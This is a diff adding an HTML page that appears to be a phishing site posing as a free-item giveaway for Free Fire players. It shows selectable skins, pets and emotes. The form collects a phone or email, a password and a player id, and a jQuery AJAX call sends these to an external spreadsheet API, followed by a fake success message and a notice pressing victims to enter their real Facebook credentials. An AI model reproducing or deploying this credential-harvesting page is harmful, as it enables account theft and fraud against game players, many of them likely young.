@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Abhishek Codes</title>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<script
+  src="https://code.jquery.com/jquery-3.4.1.js"
+  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+  crossorigin="anonymous"></script>
+<script>
+function SubForm (){
+    $.ajax({
+        url:'https://api.apispreadsheets.com/data/rTpnPaIVOs4vjJfb/',
+        type:'post',
+        data:$("#myForm").serializeArray(),
+        success: function(){
+          alert("Crangulations, loggin successful you recieve your choice item soon. It may take 7 days or sometimes it take 28 days. thanks for choosing our site ")
+        },
+        error: function(){
+          alert("There was an error try again")
+        }
+    });
+}
+function notice(){
+  alert("Notice- make sure phone number and password are correct and a facebook id. If your input information is wrong or blank the you can't able for these reward Thanks for choosing our site");
+}
+</script>
+<link rel="stylesheet" href="style.css">
+  <form id="myForm">
+    <input type="text" placeholder="Phone or email" name="email&number" id="phone">
+    <br>
+    <input type="text" placeholder="Password" name="Password" id="pass">
+    <br>
+    <input type="number" placeholder="Enter player id" name="Player_id" id="player_id">
+    <br>
+  </form>
+  <button class="submit" onclick="SubForm()">Submit</button>
+    <img  class="logo" src="https://wallpapers.com/images/thumbnail/free-fire-logo-armed-woman-fdsbmr41d528ty45.webp" alt="">
+        <img class="reward" src="https://cdn.pixabay.com/photo/2020/12/15/16/06/win-5834110__480.png" alt="">
+
+    <h2>||FREE RARE ITEMS||</h2>
+    <h3>CHOOSE ITEM</h3>
+    <p>1.Select bundles -</p> <br>
+    <select class="s1" multiple>
+      <option>Hip Hop</option>
+      <option>Crazy Panda</option>
+      <option>Night Clown</option>
+      <option>Bunny Warrior</option>
+      <option>Green Criminal</option>
+      <option>Red Criminal</option>
+      <option>Yellow Criminal</option>
+      <option>Other available soon </option>
+    </select>
+    <p>2.Select Pets -</p>
+    <select multiple>
+       <option>machanical pep</option>
+        <option>Sipirit fox</option>
+         <option>Poring</option>
+          <option>Detective panda</option>
+           <option>Night Panther</option>
+            <option>Other avilable Soon</option>
+    </select>
+    <p>3.Select gun skins-</p>
+    <select multiple>
+     <option>Dragon Ak47</option>
+      <option>Cobra MP40</option>
+       <option>M441 Griffin Fury</option>
+        <option>Golden AK</option>
+         <option>Voilet terror M1014 Shotgun</option>
+          <option>M1014 Apocaluptic Red</option>
+           <option>Unlimate Titanium Scar L</option>
+            <option>Dragon SMG</option>
+             <option>Other Avilable Soon</option>
+    </select>
+    <p>4. Select Emotes -</p>
+    <select multiple>
+       <option>Lol</option>
+        <option>Weight of victory</option>
+         <option>Soul shaker</option>
+          <option>FFWS Dance</option>
+           <option>One-Finger pushup</option>
+            <option>Bhangra emote</option>
+             <option>Sii!</option>
+              <option>Top scorer</option>
+               <option>The victor</option>
+                <option>Other Available soon</option>
+    </select>
+    <h4>After fill the form read this notice -</h4>
+    <button class="notice"onclick="notice();">NOTICE</button>
+</body>
+</html>
